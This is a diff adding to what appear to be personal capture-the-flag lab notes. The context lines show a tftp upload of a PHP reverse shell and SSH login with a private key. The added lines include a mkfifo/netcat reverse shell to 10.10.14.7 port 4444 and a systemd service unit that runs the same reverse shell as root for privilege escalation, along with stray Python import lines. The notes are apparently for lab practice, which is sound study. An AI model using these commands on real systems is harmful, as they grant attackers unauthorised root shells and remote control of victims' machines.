@@ -449,3 +449,30 @@ tftp 10.129.132.172 -m binary -c put revShell.php revShell.php
 	* How to use rsa id to ssh  
 	
 	ssh -i id_rsa daniel@10.129.140.196
+```
+python3.5 -c 'import sys; print( "\n".join(sys.path))'
+```
+
+
+from datetime import datetime
+import sys
+import os
+from os import listdir
+import re
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f
+
+
+```
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f'
+
+[Install]
+WantedBy=multi-user.target
+```
